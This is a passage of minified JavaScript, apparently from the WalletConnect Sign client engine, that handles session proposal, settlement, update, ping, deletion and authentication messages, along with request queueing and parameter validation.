                Ns.tvf = x(I({}, Ts), {
                    correlationId: oe
                }),
                ws ? (Ns.internal = x(I({}, Ns.internal), {
                    throwOnFailedPublish: !0
                }),
                await this.client.core.relayer.publish(et, _s, Ns)) : this.client.core.relayer.publish(et, _s, Ns).catch(Hs => this.client.logger.error(Hs))
            }
            await this.client.core.history.resolve(vs)
        }
        ),
        c(this, "sendError", async Z => {
            const {id: oe, topic: et, error: st, encodeOpts: ws, rpcOpts: ms, appLink: Es} = Z
              , vs = formatJsonRpcError(oe, st);
            let _s;
            const Is = Es && typeof (window == null ? void 0 : window.Linking) < "u";
            try {
                const Ts = Is ? De$1 : Qt$1;
                _s = await this.client.core.crypto.encode(et, vs, x(I({}, ws || {}), {
                    encoding: Ts
                }))
            } catch (Ts) {
                throw await this.cleanup(),
                this.client.logger.error(`sendError() -> core.crypto.encode() for topic ${et} failed`),
                Ts
            }
            let Ss;
            try {
                Ss = await this.client.core.history.get(et, oe)
            } catch (Ts) {
                throw this.client.logger.error(`sendError() -> history.get(${et}, ${oe}) failed`),
                Ts
            }
            if (Is) {
                const Ts = sa(Es, et, _s);
                await window.Linking.openURL(Ts, this.client.name)
            } else {
                const Ts = Ss.request.method
                  , Rs = ms || N[Ts].res;
                this.client.core.relayer.publish(et, _s, Rs)
            }
            await this.client.core.history.resolve(vs)
        }
        ),
        c(this, "cleanup", async () => {
            const Z = []
              , oe = [];
            this.client.session.getAll().forEach(et => {
                let st = !1;
                fi$1(et.expiry) && (st = !0),
                this.client.core.crypto.keychain.has(et.topic) || (st = !0),
                st && Z.push(et.topic)
            }
            ),
            this.client.proposal.getAll().forEach(et => {
                fi$1(et.expiryTimestamp) && oe.push(et.id)
            }
            ),
            await Promise.all([...Z.map(et => this.deleteSession({
                topic: et
            })), ...oe.map(et => this.deleteProposal(et))])
        }
        ),
        c(this, "onProviderMessageEvent", async Z => {
            !this.initialized || this.relayMessageCache.length > 0 ? this.relayMessageCache.push(Z) : await this.onRelayMessage(Z)
        }
        ),
        c(this, "onRelayEventRequest", async Z => {
            this.requestQueue.queue.push(Z),
            await this.processRequestsQueue()
        }
        ),
        c(this, "processRequestsQueue", async () => {
            if (this.requestQueue.state === $.active) {
                this.client.logger.info("Request queue already active, skipping...");
                return
            }
            for (this.client.logger.info(`Request queue starting with ${this.requestQueue.queue.length} requests`); this.requestQueue.queue.length > 0; ) {
                this.requestQueue.state = $.active;
                const Z = this.requestQueue.queue.shift();
                if (Z)
                    try {
                        await this.processRequest(Z)
                    } catch (oe) {
                        this.client.logger.warn(oe)
                    }
            }
            this.requestQueue.state = $.idle
        }
        ),
        c(this, "processRequest", async Z => {
            const {topic: oe, payload: et, attestation: st, transportType: ws, encryptedId: ms} = Z
              , Es = et.method;
            if (!this.shouldIgnorePairingRequest({
                topic: oe,
                requestMethod: Es
            }))
                switch (Es) {
                case "wc_sessionPropose":
                    return await this.onSessionProposeRequest({
                        topic: oe,
                        payload: et,
                        attestation: st,
                        encryptedId: ms
                    });
                case "wc_sessionSettle":
                    return await this.onSessionSettleRequest(oe, et);
                case "wc_sessionUpdate":
                    return await this.onSessionUpdateRequest(oe, et);
                case "wc_sessionExtend":
                    return await this.onSessionExtendRequest(oe, et);
                case "wc_sessionPing":
                    return await this.onSessionPingRequest(oe, et);
                case "wc_sessionDelete":
                    return await this.onSessionDeleteRequest(oe, et);
                case "wc_sessionRequest":
                    return await this.onSessionRequest({
                        topic: oe,
                        payload: et,
                        attestation: st,
                        encryptedId: ms,
                        transportType: ws
                    });
                case "wc_sessionEvent":
                    return await this.onSessionEventRequest(oe, et);
                case "wc_sessionAuthenticate":
                    return await this.onSessionAuthenticateRequest({
                        topic: oe,
                        payload: et,
                        attestation: st,
                        encryptedId: ms,
                        transportType: ws
                    });
                default:
                    return this.client.logger.info(`Unsupported request method ${Es}`)
                }
        }
        ),
        c(this, "onRelayEventResponse", async Z => {
            const {topic: oe, payload: et, transportType: st} = Z
              , ws = (await this.client.core.history.get(oe, et.id)).request.method;
            switch (ws) {
            case "wc_sessionPropose":
                return this.onSessionProposeResponse(oe, et, st);
            case "wc_sessionSettle":
                return this.onSessionSettleResponse(oe, et);
            case "wc_sessionUpdate":
                return this.onSessionUpdateResponse(oe, et);
            case "wc_sessionExtend":
                return this.onSessionExtendResponse(oe, et);
            case "wc_sessionPing":
                return this.onSessionPingResponse(oe, et);
            case "wc_sessionRequest":
                return this.onSessionRequestResponse(oe, et);
            case "wc_sessionAuthenticate":
                return this.onSessionAuthenticateResponse(oe, et);
            default:
                return this.client.logger.info(`Unsupported response method ${ws}`)
            }
        }
        ),
        c(this, "onRelayEventUnknownPayload", Z => {
            const {topic: oe} = Z
              , {message: et} = Et$2("MISSING_OR_INVALID", `Decoded payload on topic ${oe} is not identifiable as a JSON-RPC request or a response.`);
            throw new Error(et)
        }
        ),
        c(this, "shouldIgnorePairingRequest", Z => {
            const {topic: oe, requestMethod: et} = Z
              , st = this.expectedPairingMethodMap.get(oe);
            return !st || st.includes(et) ? !1 : !!(st.includes("wc_sessionAuthenticate") && this.client.events.listenerCount("session_authenticate") > 0)
        }
        ),
        c(this, "onSessionProposeRequest", async Z => {
            const {topic: oe, payload: et, attestation: st, encryptedId: ws} = Z
              , {params: ms, id: Es} = et;
            try {
                const vs = this.client.core.eventClient.getEvent({
                    topic: oe
                });
                this.client.events.listenerCount("session_proposal") === 0 && (console.warn("No listener for session_proposal event"),
                vs == null || vs.setError(Y.proposal_listener_not_found)),
                this.isValidConnect(I({}, et.params));
                const _s = ms.expiryTimestamp || ii$1(N.wc_sessionPropose.req.ttl)
                  , Is = I({
                    id: Es,
                    pairingTopic: oe,
                    expiryTimestamp: _s,
                    attestation: st,
                    encryptedId: ws
                }, ms);
                await this.setProposal(Es, Is);
                const Ss = await this.getVerifyContext({
                    attestationId: st,
                    hash: zc(JSON.stringify(et)),
                    encryptedId: ws,
                    metadata: Is.proposer.metadata
                });
                vs == null || vs.addTrace(G.emit_session_proposal),
                this.client.events.emit("session_proposal", {
                    id: Es,
                    params: Is,
                    verifyContext: Ss
                })
            } catch (vs) {
                await this.sendError({
                    id: Es,
                    topic: oe,
                    error: vs,
                    rpcOpts: N.wc_sessionPropose.autoReject
                }),
                this.client.logger.error(vs)
            }
        }
        ),
        c(this, "onSessionProposeResponse", async (Z, oe, et) => {
            const {id: st} = oe;
            if (isJsonRpcResult(oe)) {
                const {result: ws} = oe;
                this.client.logger.trace({
                    type: "method",
                    method: "onSessionProposeResponse",
                    result: ws
                });
                const ms = this.client.proposal.get(st);
                this.client.logger.trace({
                    type: "method",
                    method: "onSessionProposeResponse",
                    proposal: ms
                });
                const Es = ms.proposer.publicKey;
                this.client.logger.trace({
                    type: "method",
                    method: "onSessionProposeResponse",
                    selfPublicKey: Es
                });
                const vs = ws.responderPublicKey;
                this.client.logger.trace({
                    type: "method",
                    method: "onSessionProposeResponse",
                    peerPublicKey: vs
                });
                const _s = await this.client.core.crypto.generateSharedKey(Es, vs);
                this.pendingSessions.set(st, {
                    sessionTopic: _s,
                    pairingTopic: Z,
                    proposalId: st,
                    publicKey: Es
                });
                const Is = await this.client.core.relayer.subscribe(_s, {
                    transportType: et
                });
                this.client.logger.trace({
                    type: "method",
                    method: "onSessionProposeResponse",
                    subscriptionId: Is
                }),
                await this.client.core.pairing.activate({
                    topic: Z
                })
            } else if (isJsonRpcError(oe)) {
                await this.deleteProposal(st);
                const ws = ci$1("session_connect", st);
                if (this.events.listenerCount(ws) === 0)
                    throw new Error(`emitting ${ws} without any listeners, 954`);
                this.events.emit(ws, {
                    error: oe.error
                })
            }
        }
        ),
        c(this, "onSessionSettleRequest", async (Z, oe) => {
            const {id: et, params: st} = oe;
            try {
                this.isValidSessionSettleRequest(st);
                const {relay: ws, controller: ms, expiry: Es, namespaces: vs, sessionProperties: _s, scopedProperties: Is, sessionConfig: Ss} = oe.params
                  , Ts = [...this.pendingSessions.values()].find(Hs => Hs.sessionTopic === Z);
                if (!Ts)
                    return this.client.logger.error(`Pending session not found for topic ${Z}`);
                const Rs = this.client.proposal.get(Ts.proposalId)
                  , Ns = x(I(I(I({
                    topic: Z,
                    relay: ws,
                    expiry: Es,
                    namespaces: vs,
                    acknowledged: !0,
                    pairingTopic: Ts.pairingTopic,
                    requiredNamespaces: Rs.requiredNamespaces,
                    optionalNamespaces: Rs.optionalNamespaces,
                    controller: ms.publicKey,
                    self: {
                        publicKey: Ts.publicKey,
                        metadata: this.client.metadata
                    },
                    peer: {
                        publicKey: ms.publicKey,
                        metadata: ms.metadata
                    }
                }, _s && {
                    sessionProperties: _s
                }), Is && {
                    scopedProperties: Is
                }), Ss && {
                    sessionConfig: Ss
                }), {
                    transportType: Q.relay
                });
                await this.client.session.set(Ns.topic, Ns),
                await this.setExpiry(Ns.topic, Ns.expiry),
                await this.client.core.pairing.updateMetadata({
                    topic: Ts.pairingTopic,
                    metadata: Ns.peer.metadata
                }),
                this.client.events.emit("session_connect", {
                    session: Ns
                }),
                this.events.emit(ci$1("session_connect", Ts.proposalId), {
                    session: Ns
                }),
                this.pendingSessions.delete(Ts.proposalId),
                this.deleteProposal(Ts.proposalId, !1),
                this.cleanupDuplicatePairings(Ns),
                await this.sendResult({
                    id: oe.id,
                    topic: Z,
                    result: !0
                })
            } catch (ws) {
                await this.sendError({
                    id: et,
                    topic: Z,
                    error: ws
                }),
                this.client.logger.error(ws)
            }
        }
        ),
        c(this, "onSessionSettleResponse", async (Z, oe) => {
            const {id: et} = oe;
            isJsonRpcResult(oe) ? (await this.client.session.update(Z, {
                acknowledged: !0
            }),
            this.events.emit(ci$1("session_approve", et), {})) : isJsonRpcError(oe) && (await this.client.session.delete(Z, Kt$1("USER_DISCONNECTED")),
            this.events.emit(ci$1("session_approve", et), {
                error: oe.error
            }))
        }
        ),
        c(this, "onSessionUpdateRequest", async (Z, oe) => {
            const {params: et, id: st} = oe;
            try {
                const ws = `${Z}_session_update`
                  , ms = Ha.get(ws);
                if (ms && this.isRequestOutOfSync(ms, st)) {
                    this.client.logger.warn(`Discarding out of sync request - ${st}`),
                    this.sendError({
                        id: st,
                        topic: Z,
                        error: Kt$1("INVALID_UPDATE_REQUEST")
                    });
                    return
                }
                this.isValidUpdate(I({
                    topic: Z
                }, et));
                try {
                    Ha.set(ws, st),
                    await this.client.session.update(Z, {
                        namespaces: et.namespaces
                    }),
                    await this.sendResult({
                        id: st,
                        topic: Z,
                        result: !0
                    })
                } catch (Es) {
                    throw Ha.delete(ws),
                    Es
                }
                this.client.events.emit("session_update", {
                    id: st,
                    topic: Z,
                    params: et
                })
            } catch (ws) {
                await this.sendError({
                    id: st,
                    topic: Z,
                    error: ws
                }),
                this.client.logger.error(ws)
            }
        }
        ),
        c(this, "isRequestOutOfSync", (Z, oe) => oe.toString().slice(0, -3) < Z.toString().slice(0, -3)),
        c(this, "onSessionUpdateResponse", (Z, oe) => {
            const {id: et} = oe
              , st = ci$1("session_update", et);
            if (this.events.listenerCount(st) === 0)
                throw new Error(`emitting ${st} without any listeners`);
            isJsonRpcResult(oe) ? this.events.emit(ci$1("session_update", et), {}) : isJsonRpcError(oe) && this.events.emit(ci$1("session_update", et), {
                error: oe.error
            })
        }
        ),
        c(this, "onSessionExtendRequest", async (Z, oe) => {
            const {id: et} = oe;
            try {
                this.isValidExtend({
                    topic: Z
                }),
                await this.setExpiry(Z, ii$1(X)),
                await this.sendResult({
                    id: et,
                    topic: Z,
                    result: !0
                }),
                this.client.events.emit("session_extend", {
                    id: et,
                    topic: Z
                })
            } catch (st) {
                await this.sendError({
                    id: et,
                    topic: Z,
                    error: st
                }),
                this.client.logger.error(st)
            }
        }
        ),
        c(this, "onSessionExtendResponse", (Z, oe) => {
            const {id: et} = oe
              , st = ci$1("session_extend", et);
            if (this.events.listenerCount(st) === 0)
                throw new Error(`emitting ${st} without any listeners`);
            isJsonRpcResult(oe) ? this.events.emit(ci$1("session_extend", et), {}) : isJsonRpcError(oe) && this.events.emit(ci$1("session_extend", et), {
                error: oe.error
            })
        }
        ),
        c(this, "onSessionPingRequest", async (Z, oe) => {
            const {id: et} = oe;
            try {
                this.isValidPing({
                    topic: Z
                }),
                await this.sendResult({
                    id: et,
                    topic: Z,
                    result: !0,
                    throwOnFailedPublish: !0
                }),
                this.client.events.emit("session_ping", {
                    id: et,
                    topic: Z
                })
            } catch (st) {
                await this.sendError({
                    id: et,
                    topic: Z,
                    error: st
                }),
                this.client.logger.error(st)
            }
        }
        ),
        c(this, "onSessionPingResponse", (Z, oe) => {
            const {id: et} = oe
              , st = ci$1("session_ping", et);
            setTimeout( () => {
                if (this.events.listenerCount(st) === 0)
                    throw new Error(`emitting ${st} without any listeners 2176`);
                isJsonRpcResult(oe) ? this.events.emit(ci$1("session_ping", et), {}) : isJsonRpcError(oe) && this.events.emit(ci$1("session_ping", et), {
                    error: oe.error
                })
            }
            , 500)
        }
        ),
        c(this, "onSessionDeleteRequest", async (Z, oe) => {
            const {id: et} = oe;
            try {
                this.isValidDisconnect({
                    topic: Z,
                    reason: oe.params
                }),
                Promise.all([new Promise(st => {
                    this.client.core.relayer.once(C.publish, async () => {
                        st(await this.deleteSession({
                            topic: Z,
                            id: et
                        }))
                    }
                    )
                }
                ), this.sendResult({
                    id: et,
                    topic: Z,
                    result: !0
                }), this.cleanupPendingSentRequestsForTopic({
                    topic: Z,
                    error: Kt$1("USER_DISCONNECTED")
                })]).catch(st => this.client.logger.error(st))
            } catch (st) {
                this.client.logger.error(st)
            }
        }
        ),
        c(this, "onSessionRequest", async Z => {
            var oe, et, st;
            const {topic: ws, payload: ms, attestation: Es, encryptedId: vs, transportType: _s} = Z
              , {id: Is, params: Ss} = ms;
            try {
                await this.isValidRequest(I({
                    topic: ws
                }, Ss));
                const Ts = this.client.session.get(ws)
                  , Rs = await this.getVerifyContext({
                    attestationId: Es,
                    hash: zc(JSON.stringify(formatJsonRpcRequest("wc_sessionRequest", Ss, Is))),
                    encryptedId: vs,
                    metadata: Ts.peer.metadata,
                    transportType: _s
                })
                  , Ns = {
                    id: Is,
                    topic: ws,
                    params: Ss,
                    verifyContext: Rs
                };
                await this.setPendingSessionRequest(Ns),
                _s === Q.link_mode && (oe = Ts.peer.metadata.redirect) != null && oe.universal && this.client.core.addLinkModeSupportedApp((et = Ts.peer.metadata.redirect) == null ? void 0 : et.universal),
                (st = this.client.signConfig) != null && st.disableRequestQueue ? this.emitSessionRequest(Ns) : (this.addSessionRequestToSessionRequestQueue(Ns),
                this.processSessionRequestQueue())
            } catch (Ts) {
                await this.sendError({
                    id: Is,
                    topic: ws,
                    error: Ts
                }),
                this.client.logger.error(Ts)
            }
        }
        ),
        c(this, "onSessionRequestResponse", (Z, oe) => {
            const {id: et} = oe
              , st = ci$1("session_request", et);
            if (this.events.listenerCount(st) === 0)
                throw new Error(`emitting ${st} without any listeners`);
            isJsonRpcResult(oe) ? this.events.emit(ci$1("session_request", et), {
                result: oe.result
            }) : isJsonRpcError(oe) && this.events.emit(ci$1("session_request", et), {
                error: oe.error
            })
        }
        ),
        c(this, "onSessionEventRequest", async (Z, oe) => {
            const {id: et, params: st} = oe;
            try {
                const ws = `${Z}_session_event_${st.event.name}`
                  , ms = Ha.get(ws);
                if (ms && this.isRequestOutOfSync(ms, et)) {
                    this.client.logger.info(`Discarding out of sync request - ${et}`);
                    return
                }
                this.isValidEmit(I({
                    topic: Z
                }, st)),
                this.client.events.emit("session_event", {
                    id: et,
                    topic: Z,
                    params: st
                }),
                Ha.set(ws, et)
            } catch (ws) {
                await this.sendError({
                    id: et,
                    topic: Z,
                    error: ws
                }),
                this.client.logger.error(ws)
            }
        }
        ),
        c(this, "onSessionAuthenticateResponse", (Z, oe) => {
            const {id: et} = oe;
            this.client.logger.trace({
                type: "method",
                method: "onSessionAuthenticateResponse",
                topic: Z,
                payload: oe
            }),
            isJsonRpcResult(oe) ? this.events.emit(ci$1("session_request", et), {
                result: oe.result
            }) : isJsonRpcError(oe) && this.events.emit(ci$1("session_request", et), {
                error: oe.error
            })
        }
        ),
        c(this, "onSessionAuthenticateRequest", async Z => {
            var oe;
            const {topic: et, payload: st, attestation: ws, encryptedId: ms, transportType: Es} = Z;
            try {
                const {requester: vs, authPayload: _s, expiryTimestamp: Is} = st.params
                  , Ss = await this.getVerifyContext({
                    attestationId: ws,
                    hash: zc(JSON.stringify(st)),
                    encryptedId: ms,
                    metadata: vs.metadata,
                    transportType: Es
                })
                  , Ts = {
                    requester: vs,
                    pairingTopic: et,
                    id: st.id,
                    authPayload: _s,
                    verifyContext: Ss,
                    expiryTimestamp: Is
                };
                await this.setAuthRequest(st.id, {
                    request: Ts,
                    pairingTopic: et,
                    transportType: Es
                }),
                Es === Q.link_mode && (oe = vs.metadata.redirect) != null && oe.universal && this.client.core.addLinkModeSupportedApp(vs.metadata.redirect.universal),
                this.client.events.emit("session_authenticate", {
                    topic: et,
                    params: st.params,
                    id: st.id,
                    verifyContext: Ss
                })
            } catch (vs) {
                this.client.logger.error(vs);
                const _s = st.params.requester.publicKey
                  , Is = await this.client.core.crypto.generateKeyPair()
                  , Ss = this.getAppLinkIfEnabled(st.params.requester.metadata, Es)
                  , Ts = {
                    type: ee,
                    receiverPublicKey: _s,
                    senderPublicKey: Is
                };
                await this.sendError({
                    id: st.id,
                    topic: et,
                    error: vs,
                    encodeOpts: Ts,
                    rpcOpts: N.wc_sessionAuthenticate.autoReject,
                    appLink: Ss
                })
            }
        }
        ),
        c(this, "addSessionRequestToSessionRequestQueue", Z => {
            this.sessionRequestQueue.queue.push(Z)
        }
        ),
        c(this, "cleanupAfterResponse", Z => {
            this.deletePendingSessionRequest(Z.response.id, {
                message: "fulfilled",
                code: 0
            }),
            setTimeout( () => {
                this.sessionRequestQueue.state = $.idle,
                this.processSessionRequestQueue()
            }
            , cjs$3.toMiliseconds(this.requestQueueDelay))
        }
        ),
        c(this, "cleanupPendingSentRequestsForTopic", ({topic: Z, error: oe}) => {
            const et = this.client.core.history.pending;
            et.length > 0 && et.filter(st => st.topic === Z && st.request.method === "wc_sessionRequest").forEach(st => {
                const ws = st.request.id
                  , ms = ci$1("session_request", ws);
                if (this.events.listenerCount(ms) === 0)
                    throw new Error(`emitting ${ms} without any listeners`);
                this.events.emit(ci$1("session_request", st.request.id), {
                    error: oe
                })
            }
            )
        }
        ),
        c(this, "processSessionRequestQueue", () => {
            if (this.sessionRequestQueue.state === $.active) {
                this.client.logger.info("session request queue is already active.");
                return
            }
            const Z = this.sessionRequestQueue.queue[0];
            if (!Z) {
                this.client.logger.info("session request queue is empty.");
                return
            }
            try {
                this.emitSessionRequest(Z)
            } catch (oe) {
                this.client.logger.error(oe)
            }
        }
        ),
        c(this, "emitSessionRequest", Z => {
            if (this.emittedSessionRequests.has(Z.id)) {
                this.client.logger.warn({
                    id: Z.id
                }, `Skipping emitting \`session_request\` event for duplicate request. id: ${Z.id}`);
                return
            }
            this.sessionRequestQueue.state = $.active,
            this.emittedSessionRequests.add(Z.id),
            this.client.events.emit("session_request", Z)
        }
        ),
        c(this, "onPairingCreated", Z => {
            if (Z.methods && this.expectedPairingMethodMap.set(Z.topic, Z.methods),
            Z.active)
                return;
            const oe = this.client.proposal.getAll().find(et => et.pairingTopic === Z.topic);
            oe && this.onSessionProposeRequest({
                topic: Z.topic,
                payload: formatJsonRpcRequest("wc_sessionPropose", x(I({}, oe), {
                    requiredNamespaces: oe.requiredNamespaces,
                    optionalNamespaces: oe.optionalNamespaces,
                    relays: oe.relays,
                    proposer: oe.proposer,
                    sessionProperties: oe.sessionProperties,
                    scopedProperties: oe.scopedProperties
                }), oe.id),
                attestation: oe.attestation,
                encryptedId: oe.encryptedId
            })
        }
        ),
        c(this, "isValidConnect", async Z => {
            if (!Aa(Z)) {
                const {message: vs} = Et$2("MISSING_OR_INVALID", `connect() params: ${JSON.stringify(Z)}`);
                throw new Error(vs)
            }
            const {pairingTopic: oe, requiredNamespaces: et, optionalNamespaces: st, sessionProperties: ws, scopedProperties: ms, relays: Es} = Z;
            if (kt$1(oe) || await this.isValidPairingTopic(oe),
            !Ba(Es, !0)) {
                const {message: vs} = Et$2("MISSING_OR_INVALID", `connect() relays: ${Es}`);
                throw new Error(vs)
            }
            if (!kt$1(et) && Ve$1(et) !== 0) {
                const vs = "requiredNamespaces are deprecated and are automatically assigned to optionalNamespaces";
                ["fatal", "error", "silent"].includes(this.client.logger.level) ? console.warn(vs) : this.client.logger.warn(vs),
                this.validateNamespaces(et, "requiredNamespaces")
            }
            if (!kt$1(st) && Ve$1(st) !== 0 && this.validateNamespaces(st, "optionalNamespaces"),
            kt$1(ws) || this.validateSessionProps(ws, "sessionProperties"),
            !kt$1(ms)) {
                this.validateSessionProps(ms, "scopedProperties");
                const vs = Object.keys(et || {}).concat(Object.keys(st || {}));
                if (!Object.keys(ms).every(_s => vs.includes(_s.split(":")[0])))
                    throw new Error(`Scoped properties must be a subset of required/optional namespaces, received: ${JSON.stringify(ms)}, required/optional namespaces: ${JSON.stringify(vs)}`)
            }
        }
        ),
        c(this, "validateNamespaces", (Z, oe) => {
            const et = Ea(Z, "connect()", oe);
            if (et)
                throw new Error(et.message)
        }
        ),
        c(this, "isValidApprove", async Z => {
            if (!Aa(Z))
                throw new Error(Et$2("MISSING_OR_INVALID", `approve() params: ${Z}`).message);
            const {id: oe, namespaces: et, relayProtocol: st, sessionProperties: ws, scopedProperties: ms} = Z;
            this.checkRecentlyDeleted(oe),
            await this.isValidProposalId(oe);
            const Es = this.client.proposal.get(oe)
              , vs = is(et, "approve()");
            if (vs)
                throw new Error(vs.message);
            const _s = cs(Es.requiredNamespaces, et, "approve()");
            if (_s)
                throw new Error(_s.message);
            if (!it(st, !0)) {
                const {message: Is} = Et$2("MISSING_OR_INVALID", `approve() relayProtocol: ${st}`);
                throw new Error(Is)
            }
            if (kt$1(ws) || this.validateSessionProps(ws, "sessionProperties"),
            !kt$1(ms)) {
                this.validateSessionProps(ms, "scopedProperties");
                const Is = new Set(Object.keys(et));
                if (!Object.keys(ms).every(Ss => Is.has(Ss.split(":")[0])))
                    throw new Error(`Scoped properties must be a subset of approved namespaces, received: ${JSON.stringify(ms)}, approved namespaces: ${Array.from(Is).join(", ")}`)
            }
        }
        ),
        c(this, "isValidReject", async Z => {
            if (!Aa(Z)) {
                const {message: st} = Et$2("MISSING_OR_INVALID", `reject() params: ${Z}`);
                throw new Error(st)
            }
            const {id: oe, reason: et} = Z;
            if (this.checkRecentlyDeleted(oe),
            await this.isValidProposalId(oe),
            !Sa(et)) {
                const {message: st} = Et$2("MISSING_OR_INVALID", `reject() reason: ${JSON.stringify(et)}`);
                throw new Error(st)
            }
        }
        ),
        c(this, "isValidSessionSettleRequest", Z => {
            if (!Aa(Z)) {
                const {message: vs} = Et$2("MISSING_OR_INVALID", `onSessionSettleRequest() params: ${Z}`);
                throw new Error(vs)
            }
            const {relay: oe, controller: et, namespaces: st, expiry: ws} = Z;
            if (!fs(oe)) {
                const {message: vs} = Et$2("MISSING_OR_INVALID", "onSessionSettleRequest() relay protocol should be a string");
                throw new Error(vs)
            }
            const ms = va(et, "onSessionSettleRequest()");
            if (ms)
                throw new Error(ms.message);
            const Es = is(st, "onSessionSettleRequest()");
            if (Es)
                throw new Error(Es.message);
            if (fi$1(ws)) {
                const {message: vs} = Et$2("EXPIRED", "onSessionSettleRequest()");
                throw new Error(vs)
            }
        }
        ),
        c(this, "isValidUpdate", async Z => {
            if (!Aa(Z)) {
                const {message: Es} = Et$2("MISSING_OR_INVALID", `update() params: ${Z}`);
                throw new Error(Es)
            }
            const {topic: oe, namespaces: et} = Z;
            this.checkRecentlyDeleted(oe),
            await this.isValidSessionTopic(oe);
            const st = this.client.session.get(oe)
              , ws = is(et, "update()");
            if (ws)
                throw new Error(ws.message);
            const ms = cs(st.requiredNamespaces, et, "update()");
            if (ms)
                throw new Error(ms.message)
        }
        ),
        c(this, "isValidExtend", async Z => {
            if (!Aa(Z)) {
                const {message: et} = Et$2("MISSING_OR_INVALID", `extend() params: ${Z}`);
                throw new Error(et)
            }
            const {topic: oe} = Z;
            this.checkRecentlyDeleted(oe),
            await this.isValidSessionTopic(oe)
        }
        ),
        c(this, "isValidRequest", async Z => {
            if (!Aa(Z)) {
                const {message: Es} = Et$2("MISSING_OR_INVALID", `request() params: ${Z}`);
                throw new Error(Es)
            }
            const {topic: oe, request: et, chainId: st, expiry: ws} = Z;
            this.checkRecentlyDeleted(oe),
            await this.isValidSessionTopic(oe);
            const {namespaces: ms} = this.client.session.get(oe);
            if (!_a(ms, st)) {
                const {message: Es} = Et$2("MISSING_OR_INVALID", `request() chainId: ${st}`);
                throw new Error(Es)
            }
            if (!Na(et)) {
                const {message: Es} = Et$2("MISSING_OR_INVALID", `request() ${JSON.stringify(et)}`);
                throw new Error(Es)
            }
            if (!Ta(ms, st, et.method)) {
                const {message: Es} = Et$2("MISSING_OR_INVALID", `request() method: ${et.method}`);
                throw new Error(Es)
            }
            if (ws && !La(ws, _e)) {
                const {message: Es} = Et$2("MISSING_OR_INVALID", `request() expiry: ${ws}. Expiry must be a number (in seconds) between ${_e.min} and ${_e.max}`);
                throw new Error(Es)
            }
        }
        ),
        c(this, "isValidRespond", async Z => {
            var oe;
            if (!Aa(Z)) {
                const {message: ws} = Et$2("MISSING_OR_INVALID", `respond() params: ${Z}`);
                throw new Error(ws)
            }
            const {topic: et, response: st} = Z;
            try {
                await this.isValidSessionTopic(et)
            } catch (ws) {
                throw (oe = Z == null ? void 0 : Z.response) != null && oe.id && this.cleanupAfterResponse(Z),
                ws
            }
            if (!Oa(st)) {
                const {message: ws} = Et$2("MISSING_OR_INVALID", `respond() response: ${JSON.stringify(st)}`);
                throw new Error(ws)
            }
        }
        ),
        c(this, "isValidPing", async Z => {
            if (!Aa(Z)) {
                const {message: et} = Et$2("MISSING_OR_INVALID", `ping() params: ${Z}`);
                throw new Error(et)
            }
            const {topic: oe} = Z;
            await this.isValidSessionOrPairingTopic(oe)
        }
        ),
        c(this, "isValidEmit", async Z => {
            if (!Aa(Z)) {
                const {message: ms} = Et$2("MISSING_OR_INVALID", `emit() params: ${Z}`);
                throw new Error(ms)
            }
            const {topic: oe, event: et, chainId: st} = Z;
            await this.isValidSessionTopic(oe);
            const {namespaces: ws} = this.client.session.get(oe);
            if (!_a(ws, st)) {
                const {message: ms} = Et$2("MISSING_OR_INVALID", `emit() chainId: ${st}`);
                throw new Error(ms)
            }
            if (!Ua(et)) {
                const {message: ms} = Et$2("MISSING_OR_INVALID", `emit() event: ${JSON.stringify(et)}`);
                throw new Error(ms)
            }
            if (!Ra(ws, st, et.name)) {
                const {message: ms} = Et$2("MISSING_OR_INVALID", `emit() event: ${JSON.stringify(et)}`);
                throw new Error(ms)
            }
        }
        ),
        c(this, "isValidDisconnect", async Z => {
            if (!Aa(Z)) {
                const {message: et} = Et$2("MISSING_OR_INVALID", `disconnect() params: ${Z}`);
                throw new Error(et)
            }
            const {topic: oe} = Z;
            await this.isValidSessionOrPairingTopic(oe)
        }
        ),
        c(this, "isValidAuthenticate", Z => {
            const {chains: oe, uri: et, domain: st, nonce: ws} = Z;
            if (!Array.isArray(oe) || oe.length === 0)
                throw new Error("chains is required and must be a non-empty array");
            if (!it(et, !1))
                throw new Error("uri is required parameter");
            if (!it(st, !1))
                throw new Error("domain is required parameter");
            if (!it(ws, !1))
                throw new Error("nonce is required parameter");
            if ([...new Set(oe.map(Es => Fe$1(Es).namespace))].length > 1)
                throw new Error("Multi-namespace requests are not supported. Please request single namespace only.");
            const {namespace: ms} = Fe$1(oe[0]);
            if (ms !== "eip155")
                throw new Error("Only eip155 namespace is supported for authenticated sessions. Please use .connect() for non-eip155 chains.")
        }
        ),
        c(this, "getVerifyContext", async Z => {
            const {attestationId: oe, hash: et, encryptedId: st, metadata: ws, transportType: ms} = Z
              , Es = {
                verified: {
                    verifyUrl: ws.verifyUrl || ue,
                    validation: "UNKNOWN",
                    origin: ws.url || ""
                }
            };
            try {
                if (ms === Q.link_mode) {
                    const _s = this.getAppLinkIfEnabled(ws, ms);
                    return Es.verified.validation = _s && new URL(_s).origin === new URL(ws.url).origin ? "VALID" : "INVALID",
                    Es
                }
                const vs = await this.client.core.verify.resolve({
                    attestationId: oe,
                    hash: et,
                    encryptedId: st,
                    verifyUrl: ws.verifyUrl
                });
                vs && (Es.verified.origin = vs.origin,
                Es.verified.isScam = vs.isScam,
                Es.verified.validation = vs.origin === new URL(ws.url).origin ? "VALID" : "INVALID")
            } catch (vs) {
                this.client.logger.warn(vs)
            }
            return this.client.logger.debug(`Verify context: ${JSON.stringify(Es)}`),
            Es
        }
        ),
        c(this, "validateSessionProps", (Z, oe) => {
            Object.values(Z).forEach( (et, st) => {
                if (et == null) {
                    const {message: ws} = Et$2("MISSING_OR_INVALID", `${oe} must contain an existing value for each key. Received: ${et} for key ${Object.keys(Z)[st]}`);
                    throw new Error(ws)
                }
            }
            )
        }
        ),
        c(this, "getPendingAuthRequest", Z => {
            const oe = this.client.auth.requests.get(Z);
            return typeof oe == "object" ? oe : void 0
        }
        ),
        c(this, "addToRecentlyDeleted", (Z, oe) => {
            if (this.recentlyDeletedMap.set(Z, oe),
            this.recentlyDeletedMap.size >= this.recentlyDeletedLimit) {
                let et = 0;
                const st = this.recentlyDeletedLimit / 2;
                for (const ws of this.recentlyDeletedMap.keys()) {
                    if (et++ >= st)
                        break;
                    this.recentlyDeletedMap.delete(ws)
                }
            }
        }
        ),
        c(this, "checkRecentlyDeleted", Z => {
            const oe = this.recentlyDeletedMap.get(Z);
            if (oe) {
                const {message: et} = Et$2("MISSING_OR_INVALID", `Record was recently deleted - ${oe}: ${Z}`);
                throw new Error(et)
            }
        }
        ),
